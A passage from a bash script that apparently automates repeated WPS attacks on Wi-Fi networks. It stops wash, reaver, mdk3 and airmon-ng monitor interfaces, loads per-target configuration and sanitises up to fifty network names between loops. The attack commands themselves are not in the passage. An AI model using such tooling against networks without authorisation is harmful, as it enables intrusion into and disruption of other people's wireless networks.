echo -ne "$info  Time before program restart $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

	fi

if  [ $WASH_COUNT == n ] || [ $WASH_COUNT == N ]; then

		sleep $PAUSE

		fi

echo -e "$txtrst "

# sleep $PAUSE

killall -q wash &> /dev/null
killall -q reaver &> /dev/null 
killall -q mdk3 &> /dev/null
killall -q Eterm &> /dev/null
clear
sleep 2

###############################END USR Block################################################
############################################################################################

OVERRIDE_MDK3=n

source /root/VARMAC_CONFIG/$SOURCENAME

##################Retain original names for text warning##########
NMEWARN1=$NAME1
NMEWARN2=$NAME2
NMEWARN3=$NAME3
NMEWARN4=$NAME4
NAMWARN5=$NAME5
NMEWARN6=$NAME6
NMEWARN7=$NAME7
NMEWARN8=$NAME8
NMEWARN9=$NAME9
NMEWARN10=$NAME10
NMEWARN11=$NAME11
NMEWARN12=$NAME12
NMEWARN13=$NAME13
NMEWARN14=$NAME14
NMEWARN15=$NAME15
NMEWARN16=$NAME16
NMEWARN17=$NAME17
NMEWARN18=$NAME18
NMEWARN19=$NAME19
NMEWARN20=$NAME20
NMEWARN21=$NAME21
NMEWARN22=$NAME22
NMEWARN23=$NAME23
NMEWARN24=$NAME24
NMEWARN25=$NAME25
NMEWARN26=$NAME26
NMEWARN27=$NAME27
NMEWARN28=$NAME28
NMEWARN29=$NAME29
NMEWARN30=$NAME30
NMEWARN31=$NAME31
NMEWARN32=$NAME32
NMEWARN33=$NAME33
NMEWARN34=$NAME34
NMEWARN35=$NAME35
NMEWARN36=$NAME36
NMEWARN37=$NAME37
NMEWARN38=$NAME38
NMEWARN39=$NAME39
NMEWARN40=$NAME40
NMEWARN41=$NAME41
NMEWARN42=$NAME42
NMEWARN43=$NAME43
NMEWARN44=$NAME44
NMEWARN45=$NAME45
NMEWARN46=$NAME46
NMEWARN47=$NAME47
NMEWARN48=$NAME48
NMEWARN49=$NAME49
NMEWARN50=$NAME50

##########End retain original name for reaver warnings########
###########Remove Spaces in Names for file names#########

NAME1=${NAME1// /_}
NAME2=${NAME2// /_}
NAME3=${NAME3// /_}
NAME4=${NAME4// /_}
NAME5=${NAME5// /_}
NAME6=${NAME6// /_}
NAME7=${NAME7// /_}
NAME8=${NAME8// /_}
NAME9=${NAME9// /_}
NAME10=${NAME10// /_}
NAME11=${NAME11// /_}
NAME12=${NAME12// /_}
NAME13=${NAME13// /_}
NAME14=${NAME14// /_}
NAME15=${NAME15// /_}
NAME16=${NAME16// /_}
NAME17=${NAME17// /_}
NAME18=${NAME18// /_}
NAME19=${NAME19// /_}
NAME20=${NAME20// /_}
NAME21=${NAME21// /_}
NAME22=${NAME22// /_}
NAME23=${NAME23// /_}
NAME24=${NAME24// /_}
NAME25=${NAME25// /_}
NAME26=${NAME26// /_}
NAME27=${NAME27// /_}
NAME28=${NAME28// /_}
NAME29=${NAME29// /_}
NAME30=${NAME30// /_}
NAME31=${NAME31// /_}
NAME32=${NAME32// /_}
NAME33=${NAME33// /_}
NAME34=${NAME34// /_}
NAME35=${NAME35// /_}
NAME36=${NAME36// /_}
NAME37=${NAME37// /_}
NAME38=${NAME38// /_}
NAME39=${NAME39// /_}
NAME40=${NAME40// /_}
NAME41=${NAME41// /_}
NAME42=${NAME42// /_}
NAME43=${NAME43// /_}
NAME44=${NAME44// /_}
NAME45=${NAME45// /_}
NAME46=${NAME46// /_}
NAME47=${NAME47// /_}
NAME48=${NAME48// /_}
NAME49=${NAME49// /_}
NAME50=${NAME50// /_}

##########End Remove Spaces in Names#########

sleep 1
killall -q wash &> /dev/null
killall -q reaver &> /dev/null 
killall -q mdk3 &> /dev/null
killall -q Eterm &> /dev/null
clear
airmon-ng stop $MON1
airmon-ng stop $MON2

let COUNT=COUNT-1
let FN=FN+1

sleep 1

done

echo "loops completed"
sleep 10
read